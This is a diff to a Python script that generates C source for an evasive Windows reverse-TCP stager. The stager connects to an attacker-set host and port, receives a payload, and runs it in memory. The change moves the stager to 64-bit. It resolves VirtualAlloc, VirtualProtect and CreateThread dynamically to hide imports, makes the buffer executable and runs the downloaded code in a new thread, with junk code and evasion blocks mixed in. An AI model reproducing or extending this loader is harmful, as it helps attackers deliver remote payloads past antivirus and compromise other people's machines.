@@ -43,8 +43,6 @@ Randbuff = varname_creator()
 
 Randvar = varname_creator()
 
-Randfunc = varname_creator()
-
 Randversion = varname_creator()
 
 Randwsadata = varname_creator()
@@ -62,6 +60,24 @@ Randtret = varname_creator()
 Randnret = varname_creator()
 
 Randstartb = varname_creator()
+
+Ndcvirtual = varname_creator()
+
+Ndcvirtualpro = varname_creator()
+
+Ndccreatethread = varname_creator()
+
+Ndcwaitforsobj = varname_creator()
+
+Randhand = varname_creator()
+
+Randresult = varname_creator()
+
+Randthread = varname_creator()
+
+Oldprot = varname_creator()
+
+Randbool = varname_creator()
 
 Junkcode_01 = Junkmathinject()
 Junkcode_02 = Junkmathinject()
@@ -98,11 +114,10 @@ WinEvasion_09 = windows_evasion()
 
 
 Hollow_code = ""
-Hollow_code += "#define _WIN32_WINNT 0x0500\n"
 Hollow_code += "#include <winsock2.h>\n"
 
 
-Include_List = ["#include <stdlib.h>\n","#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <time.h>\n","#include <math.h>\n"]
+Include_List = ["#include <stdlib.h>\n","#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <time.h>\n","#include <math.h>\n","#include <stdint.h>\n"]
 
 shuffle(Include_List)
 
@@ -113,10 +128,10 @@ for i in range(0,len(Include_List)):
 Hollow_code += "int main(int argc,char * argv[]){\n"
 Hollow_code += Junkcode_01
 Hollow_code += Junkcode_02
-Hollow_code += Junkcode_03
 Hollow_code += WinEvasion_01
 Hollow_code += WinEvasion_02
 Hollow_code += WinEvasion_03
+Hollow_code += Junkcode_03
 Hollow_code += WinEvasion_04
 Hollow_code += WinEvasion_05
 Hollow_code += Junkcode_04
@@ -126,41 +141,50 @@ Hollow_code += WinEvasion_08
 Hollow_code += WinEvasion_09
 Hollow_code += Junkcode_05
 Hollow_code += spawn_multiple_process(SpawnMultiProc)
-Hollow_code += "ULONG32 " + Randvarsize + ";char * " + Randbuff + ";int " + Randvar + ";\n"
-Hollow_code += "void (*" + Randfunc + ")();\n"
+Hollow_code += "HANDLE " + Randhand + "; DWORD " + Randthread + "; DWORD " + Randresult + ";\n"
+Hollow_code += "ULONG64 " + Randvarsize + ";char * " + Randbuff + ";int " + Randvar + ";\n"
 Hollow_code += "WORD " + Randversion + " = MAKEWORD(2,2);WSADATA " + Randwsadata + ";\n"
 Hollow_code += "if (WSAStartup(" + Randversion + ", &" + Randwsadata + ") < 0){"
 Hollow_code += Junkcode_06
 Hollow_code += "WSACleanup();exit(1);}\n"
 Hollow_code += "struct hostent * " + Randtarget + ";struct sockaddr_in " + Randsock + ";SOCKET " + RandSocket + ";\n"
-Hollow_code += "" + RandSocket + " = socket(AF_INET, SOCK_STREAM, 0);\n"
+Hollow_code += RandSocket + " = socket(AF_INET, SOCK_STREAM, 0);\n"
 Hollow_code += "if (" + RandSocket + " == INVALID_SOCKET){ " + Junkcode_07 + "closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
 Hollow_code += Junkcode_08
-Hollow_code += "" + Randtarget + " = gethostbyname(\"" + Lhost + "\");\n"     #Lhost
+Hollow_code += Randtarget + " = gethostbyname(\"" + Lhost + "\");\n"     #Lhost
 Hollow_code += "if (" + Randtarget + " == NULL){ " + Junkcode_09 + "closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
 Hollow_code += "memcpy(&" + Randsock + ".sin_addr.s_addr, " + Randtarget + "->h_addr, " + Randtarget + "->h_length);\n"
-
-Hollow_code += "" + Randsock + ".sin_family = AF_INET;\n"
+Hollow_code += Randsock + ".sin_family = AF_INET;\n"
 Hollow_code += Junkcode_10
-Hollow_code += "" + Randsock + ".sin_port = htons((" + Lport + "));\n"        #Lport
+Hollow_code += Randsock + ".sin_port = htons((" + Lport + "));\n"        #Lport
 Hollow_code += "if ( connect(" + RandSocket + ", (struct sockaddr *)&" + Randsock + ", sizeof(" + Randsock + ")) ){" + Junkcode_11 + " closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
 Hollow_code += Junkcode_12
-Hollow_code += "int " + Randint + " = recv(" + RandSocket + ", (char *)&" + Randvarsize + ", 4, 0);\n"
+Hollow_code += "int64_t " + Randint + " = recv(" + RandSocket + ", (char *)&" + Randvarsize + ", 4, 0);\n"
 Hollow_code += "if (" + Randint + " != (4) || " + Randvarsize + " <= 0) { " + Junkcode_13 + "closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
-Hollow_code += "" + Randbuff + " = VirtualAlloc(0, " + Randvarsize + " + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
+Hollow_code += "FARPROC " + Ndcvirtual + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"VirtualAlloc\");\n"
+Hollow_code += Randbuff + " = (LPVOID)" + Ndcvirtual + "(0, " + Randvarsize + " + 10,MEM_COMMIT,PAGE_READWRITE);\n"
 Hollow_code += "if (" + Randbuff + " == NULL) { " + Junkcode_14 + "closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
 Hollow_code += Junkcode_15
-Hollow_code += "" + Randbuff + "[0] = 0xBF;\n"
-Hollow_code += "memcpy(" + Randbuff + " + 1, &" + RandSocket + ", 4);\n"
+Hollow_code += Randbuff + "[0] = 0x48;\n"
+Hollow_code += Randbuff + "[1] = 0xBF;\n"
+Hollow_code += "memcpy(" + Randbuff + " + 2, &" + RandSocket + ", 4);\n"
 Hollow_code += Junkcode_16
-Hollow_code += "int " + Randtret + "=0;int " + Randnret + "=0;\n"
-Hollow_code += "void * " + Randstartb + " = " + Randbuff + " + 4;\n"
+Hollow_code += "int64_t " + Randtret + "=0;int64_t " + Randnret + "=0;\n"
+Hollow_code += "void * " + Randstartb + " = " + Randbuff + " + 10;\n"
 Hollow_code += "while (" + Randnret + " < " + Randvarsize + "){\n"
-Hollow_code += "" + Randtret + " = recv(" + RandSocket + ", (char *)" + Randstartb + ", " + Randvarsize + " - " + Randnret + ", 0);\n"
-Hollow_code += "" + Randstartb + " += " + Randtret + ";" + Randnret + " += " + Randtret + ";\n"
+Hollow_code += Randtret + " = recv(" + RandSocket + ", (char *)" + Randstartb + ", " + Randvarsize + " - " + Randnret + ", 0);\n"
+Hollow_code += Randstartb + " += " + Randtret + ";" + Randnret + " += " + Randtret + ";\n"
 Hollow_code += "if (" + Randtret + " == SOCKET_ERROR) {" + Junkcode_17 + " closesocket(" + RandSocket + ");WSACleanup();exit(1);}}\n"
+Hollow_code += Randint + " = " + Randnret + ";\n"
+Hollow_code += "FARPROC " + Ndcvirtualpro + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"VirtualProtect\");\n"
+Hollow_code += "DWORD " + Oldprot + ";\n"
+Hollow_code += "BOOL " + Randbool + " = (BOOL)" + Ndcvirtualpro + "(" + Randbuff + "," + Randvarsize + " + 10,0x40,&" + Oldprot + ");\n"
+Hollow_code += "FARPROC " + Ndccreatethread + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"CreateThread\");\n"
+Hollow_code += "FARPROC " + Ndcwaitforsobj + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"WaitForSingleObject\");\n"
 Hollow_code += Junkcode_18
-Hollow_code += "" + Randint + " = " + Randnret + ";" + Randfunc + " = (void (*)())" + Randbuff + ";" + Randfunc + "();\n"
+Hollow_code += Randhand + " = (HANDLE) " + Ndccreatethread + "(NULL,0,(LPVOID)" + Randbuff + ",NULL,0,&"+ Randthread + ");\n"
+Hollow_code += Junkcode_19
+Hollow_code += Randresult + " = (DWORD)" + Ndcwaitforsobj + "(" + Randhand + ",-1);\n" 
 Hollow_code += close_brackets_multiproc(SpawnMultiProc)
 Hollow_code += "}}}}}\n"
 Hollow_code += "}else{" + Junkcode_19 + "}\n"
